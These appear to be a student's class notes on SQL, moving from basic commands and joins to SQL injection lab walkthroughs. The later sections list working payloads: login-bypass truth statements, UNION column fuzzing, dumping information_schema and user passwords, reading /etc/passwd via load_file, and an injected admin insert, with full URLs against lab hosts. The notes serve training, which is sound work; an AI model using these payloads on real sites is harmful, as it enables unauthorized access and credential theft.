SQL
    - structured query language - ANSI standard
    - most versions share common commands
STANDARD COMMANDS
    - heavily used commands
        -  SELECT 
        -  UNION 
-  USE             select the DB you would like to use.
-  SELECT          extracts data from a database
-  UPDATE          updates data in a database
-  DELETE          deletes data from a database
-  INSERT INTO     inserts new data into a database
-  CREATE DATABASE creates a new database
-  ALTER DATABASE  modifies a database
-  CREATE TABLE    creates a new table
-  ALTER TABLE     modifies a table
-  DROP TABLE      deletes a table
-  CREATE INDEX    creates an index (search key)
-  DROP INDEX      deletes an index
-  UNION           Used to combine the result-set of two or more SELECT statements
SQL DEMO
    - to gain access to sql type in "mysql"
    - version used in class is MariaDB
    - normally logged in as root, to specify user  "mysql --user=root --pass=password"
    Database = DOD
    Table = USMC, USAF,
    Column = Rank, Lname, EDIPI
SHOW COMMAND 
    - show databases;
        - requires the semicolon 
    - DEFAULT DATABASES
        - information_scheme = database of databases
            - if you are targeting the sql database you WILL BE TARGETING THIS DEFAULT DATABASE 
        - my_sql = configuration settings,user configurations, USERNAMES, PASSWORD HASHES,
        - performance_scheme = status information
   - CUSTOM DATABASE
      - Session = custom
   - show tables from information_scheme == key to the streets
      - will display "tables_in_information+scheme" and the tables within that database, can be applied to any database on the sql system
      - to access any of these tables within said database
          - select * from session.tires 
                - session is the database, tires is the table within said database
                - this will produce the content of the tires table
          - to access a specific item from the car table
              - select carid,type,color from session.car
COMBINING STATEMENTS
      1. nesting statements
          - to use multiple stataments and have multiple outputs, run  multiple commands split by semicolons
          - select * from session.car; select * from session.tires
      
      
      2. joining statements
          - select * from session.car UNION select * from session.tires;
          - select * from session.car UNION select *,1,2 from session.tires;
          - what is the point.
          - use inner join and use the ON command to match matching values
DESCRIBE COMMAND
  - describe <database>.<table>;
      - gives you the data type of the values in the table
SQLBOLT
  - queries with constraints 
  - select * frm mytable
  where id == 6
  can use between statements, and statements, or statements, and logical numerical operators
  - use limit to get the first 5 values of a table
  - using LIKE to find string
        - use % to denote the wildcard characters
  - orderby <column> 
      - alphabetically organizes the table by the column specified
      - also use DISTINCT command to get rid of duplicates
      - use DESC to sort descending order 
      - always use the column that is most left when using multiple columsn in a single line
      - when offsetting "limit 5 offest 5;"
      - higher latitude == north 
  - LEFT JOIN simply includes rows from A regardless of wheter a matching row is found in B
  - RIGHT JOIN is the same but reversed, keeping rows in B regardless of whether a match is found in A
  - FULL JOIN simply means that rows from both tables are kept regardless of wheter a matching row exists in the other taable
SQL INJECTION 
    - considerations
        - require valid sql queries
        - fully patched systems can be vulnerable due to misconfiguration
        - input field sanitization 
        - string vs integer values
        - is information_schema database availabe? ( NEEDED ) 
        - GET Request versus POST Request HTTP methods 
    - UNSANTIZED VS SANITZIED FIELD
        - unsanitized: input fields can be found using a single quote "'"
          - will return extraneous information
          - ' closes a variable to allow for additional statements/clauses
          - may show no errors or generic error (harder injection)
        - sanitized: input fields are checked for items that might harm the database (items are removed, escaped, or turned into a single string)
    - validation: checks inputs to ensure it meets a criteria (string doesn't contain ') 
    - $name = [ daniel ] 
    - $pass = [ password ] 
    - seelct id from users where name = '$name' and pass='$pass';
    - select id from users where name='daniel'
        - and pass='password';
    - select id from users where name='daniel' or 1='1'= and pass='password' or 1='1'
        - injected a truth statement, where no matter if the password is correct or incorrect, it will grant access
SQL INJECTION DEMO
    - login - credentials
    - dan - password
    - query string parameters
        - username
        - password
    1. determine if login page is vulnerable to sql injection via truth statement
        - Generic truth statement
        - <value>' or 1='1'
    what did we determine 
        - vulnerable to sql injection
        - admin is a user
   2. exploit vulnerable login page (GET METHOD w/ trtuh statement)
        - http://10.50.21.144/login.php
        - http://10.50.21.144/login.php?username=dan%27%20or%201=%271&passwd=dan%27%20or%201=%271
    - SQL INJECTION - webpages - GET METHOD 
        - behavior analysis 
            - only valid values will display information form the table on a webpage
        1. determine vulnerable webpage via truth statement 
            - generic truth statement
                - <value>' or 1='1
                - <VALUE>' or 1 ='1;
                - <value>' or 1='1&
                - <value>' or 1='1; #
                - <value>' or 1='1; --
                - TRY FOR ALL VALUES GIVEN 
        2. determine the number of columsn that exit on the webpage via fuzzing
        - rows 5 a
        - columns : 4<==== lowest 
            start with the lowest number
        - AUdi' UNION select 1,2,3,4,5 
        3. determine the number of columns, the order, and if there are any hidden columsn
              - because it accepts 5 values despite only displaying fouyr that measn that ther ie is a hidden column
        4. dumping/extracting information via golden statement 
            - audi' UNION select 1,2,3,4,5;# 
            Generic SQL statements
              - select <column> from <databae>.<tabel>
                select
                tabel_schema,table_name,column_name from information_schema.columns
             information_schema= database, databaser of database, provides all information pertaining to database information
             columns = table, that exists inside the information_schema database 
             column_name = column inside the columns table, list out column names
             audi' UNION select 1,2,3,4,5;#
             audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns; #
       5. extract desired information 
           - id,name,passwor 
           - audi' UNION select id,2,name,pass,5 from session.user; #
SQL INJECTION -webpages - GET method
         1. determine vulnerable webpage via truth statement 
         http://10.50.21.144/Uniondemo.php?selection=1or 1=1
         http://10.50.21.144/Uniondemo.php?selection=1 or 1=1;
         http://10.50.21.144/Uniondemo.php?selection=1 or 1=1; #
         http://10.50.21.144/Uniondemo.php?selection=1 or 1=1; --
         
         
         http://10.50.21.144/Uniondemo.php?selection=1or 1=1
         CHECK ALL SELECTIONS
         
              generic truth statement (get)
              <value> or 1=1
              <value> or 1=1;
              <value> or 1=1; #
              <value< or 1=1; --
         2. determine the number of columns that exist on the table displaayed on the webpage
            rows = 5 
            columns = 3 
            start fuzzing on lowest number 
            
         3.    http://10.50.21.144/uniondemo.php?selection=2 or 1=1 UNION select 1,2,3
            NEEDS TO MATCH THE COLUMN AMOUNT 
            - display order == 1,3,2
            Hidden columns = N/A
         4. dumping/extracting information via golden statement 
              - http://10.50.21.144/uniondemo.php?Selection=2%20or%201=1%20UNION%20select%20id,name,pass%20from%20session.user
           select table_schema,table_name,column_name from information_schema.columns
           where table_schema like "session"
           UNION 1,2,load_file('/etc/passwd')
          http://10.50.21.144/uniondemo.php?Selection=2%20or%201=1%20UNION%20select%201,2,load_file(%27/etc/passwd%27)
          GIVES PASSWORD
          UNION 1,2,@@version
          gives sql version on box
CTFD 
    http://localhost:11200/cases/productsCategory.php?category=1%20or%201=1%20UNION%20select%20table_schema,table_name,column_name%20from%20information_schema.columns
   
INSERT INTO members (first_name, last_name, username, 
password, email, permission) VALUES ('Hacker', 'Hackerman', 'Admin', '0', '1', 3)
         - to gain access to the permissions field, comment out the last enterable field to gain access
         
